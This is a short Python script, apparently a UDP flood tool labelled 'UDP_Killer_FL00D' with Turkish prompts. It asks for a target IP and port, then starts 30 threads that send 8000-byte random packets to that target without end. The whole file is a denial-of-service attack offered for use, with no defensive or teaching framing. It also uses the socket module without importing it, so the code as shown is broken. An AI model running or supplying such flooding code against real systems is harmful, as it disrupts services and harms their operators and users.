import time
import os
import threading

def floodme(ip, port, payload):
  udpserver = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  while True:
   udpserver.sendto(payload, (ip, port))

print("|====={UDP_Killer_FL00D}=====|")
print(" ")
time.sleep(1)
ip = input("IP Giriniz: ")
port = int(input("PORT Giriniz: "))
payload = os.urandom(8000)
os.system("clear")

for i in range(30):
  threading.Thread(target=floodme, args=(ip, port, payload)).start()

print("|====={UDP_Killer_FL00D}=====|")
print(" ")
print(f"Hedef IP: {ip}")
print(f"Hedef Port: {port}")
print("UDP Bot Sayısı: 30")